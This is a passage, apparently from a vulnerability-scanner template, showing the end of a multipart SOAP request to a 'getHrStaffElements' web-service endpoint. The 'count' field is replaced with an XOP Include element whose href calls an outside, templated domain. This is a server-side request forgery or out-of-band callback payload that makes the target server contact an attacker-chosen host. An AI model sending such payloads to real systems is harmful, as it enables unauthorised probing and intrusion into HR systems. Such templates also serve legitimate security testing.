    <soapenv:Body>\n    <web:getHrStaffElements>\n        <arg0>\n            <beginTimeStamp>1</beginTimeStamp>\n\
    \            <count><xop:Include \nxmlns:xop=\"http://www.w3.org/2004/08/xop/include\"\
    \ \nhref=\"https://{{.domain}}\"/></count>\n        </arg0>\n    </web:getHrStaffElements>\n\
    </soapenv:Body>\n</soapenv:Envelope>\n------frhpvivnctknnkiwugaq--"
